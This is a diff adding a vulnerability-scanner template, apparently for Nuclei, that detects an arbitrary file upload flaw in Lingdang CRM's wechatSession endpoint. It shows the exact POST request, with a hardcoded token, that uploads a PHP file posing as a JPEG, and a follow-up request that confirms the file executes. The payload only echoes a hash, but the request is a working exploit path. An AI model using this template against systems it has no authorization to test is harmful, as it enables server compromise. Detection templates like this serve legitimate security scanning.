@@ -1,0 +1,54 @@
+id: poc-yaml-51mis-crm-wechatsession-anyfile-upload
+info:
+  name: 灵当CRM wechatSession 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload"
+    headers:
+      Content-Type: multipart/form-data; boundary=9f57d14038b72104f2b6fafebf51c117
+    body: |-
+      --9f57d14038b72104f2b6fafebf51c117
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      --9f57d14038b72104f2b6fafebf51c117--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"upload_status":true'
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/crm/storage/wechatsession/{{dt1}}/{{dt2}}/{{dt3}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
